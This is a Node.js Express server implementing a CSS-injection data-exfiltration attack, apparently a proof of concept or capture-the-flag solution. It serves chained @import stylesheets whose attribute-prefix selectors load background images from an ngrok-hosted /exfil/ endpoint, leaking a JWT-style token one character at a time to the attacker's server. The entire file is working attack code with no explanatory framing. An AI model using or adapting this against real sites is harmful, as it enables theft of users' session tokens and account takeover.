const cssesc = require('cssesc');
const express = require('express');
const app = express();
app.disable('etag');
 
const PORT = 22473;

let prefix = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6";
let pendingResponses = {};
let possibleChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-";
let responseTimeout = -1;
let reqNumber = 0;
let serverUrl = 'https://f3c254da9e3e.ngrok.io'

app.use(express.static(process.cwd()));
 
// Create/return an attack css 
app.get("/a", function(req, res) {
    reqNumber++;
    console.log('Got request for import #', req.query.r)
    pendingResponses[parseInt(req.query.r)] = res;
    if (req.query.r === "0") {
        responseTimeout = setTimeout(() => {
            respondToQueuedRequest();
        }, 0);
    }
});

app.get("/exfil/:value", function(req, res) {
    prefix = req.params.value;
    console.log('Got prefix', prefix);
    res.send('bleh');
    console.log('Sending next import');
    responseTimeout = setTimeout(() => {
      respondToQueuedRequest();
  }, 0);
});
 
app.listen(PORT, () => {
  console.log(`Listening on ${PORT}...`);
  console.log(`First url: ${serverUrl}/a?r=0`);
});

function encodeURIAll(input) {
  let out = encodeURIComponent(input);
  out = out.replace(/\!/g, '%21');
  out = out.replace(/\./g, '%2E');
  out = out.replace(/\'/g, '%27');
  out = out.replace(/\-/g, '%2D');
  return out;
}

function getSelector(reqNos) {
  let sel = ".token";
  for(let i = 0; i < reqNos; i++) {
    sel += ".token";
  }
  return sel;
}

function generateStyle(prefix, selectorPrefix) {
  let urlPrefix = encodeURIAll(prefix);
  let cssPrefix = cssesc(prefix, { isIdentifier: true });
  message = "";
  possibleChars.split('').forEach(char => {
      let urlChar = encodeURIAll(char);
      let cssChar = cssesc(char, { isIdentifier: true });
      message += selectorPrefix + " h2[value^=" + cssPrefix + cssChar + '] { background-image: url('+ serverUrl + '/exfil/' + urlPrefix + urlChar + '); }\n';
  });
  return message;
}

function respondToQueuedRequest() {
    let reqNos = Object.keys(pendingResponses);
    let nextResponseNum = Math.min(...reqNos);
    let res = pendingResponses[nextResponseNum];
    delete pendingResponses[nextResponseNum];
    let css;
    console.log('Responding to import request', nextResponseNum);
    css = `
    @import url(${serverUrl}/a?r=${reqNumber});

    ${generateStyle(prefix, getSelector(nextResponseNum))}
    `;
    res.setHeader('content-type', 'text/css');
    res.send(css);
}